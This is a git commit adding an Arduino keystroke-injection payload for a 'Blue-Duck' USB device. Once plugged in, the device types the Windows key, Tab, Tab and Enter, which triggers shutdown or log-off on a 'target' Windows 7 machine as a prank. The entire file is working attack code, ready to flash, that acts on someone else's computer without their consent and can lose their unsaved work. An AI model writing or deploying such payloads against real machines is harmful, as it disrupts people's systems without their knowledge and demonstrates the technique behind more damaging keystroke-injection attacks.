e2fc573fe46ae0421f9a202f9029f6c6da02cf18
Darren Rainey <darren@darrenraineys.co.uk>
2016-12-10 21:52:19 +0000

    Added Windows 7 Logoff / Shutdown Prank

---
+++ Payloads/Blue-Duck/Windows/Windows 7/Windows-7-Logoff-Shutdown-Prank.ino
@@ -0,0 +1,49 @@
+/*
+ *  Windows 7 Logoff/Shut down prank by Darren Rainey 
+ *  http://youtube.com/DarrenRainey
+ *  This script will open the start menu and either press the
+ *  shutdown or log off button depending on how the target is 
+ *  set uo
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // Script by Darren Rainey http://github.com/DarrenRainey
+  delay(500);
+
+  typeKey(KEY_LEFT_GUI);
+
+  delay(150);
+
+  typeKey(KEY_TAB);
+
+  delay(150);
+
+  typeKey(KEY_TAB);
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
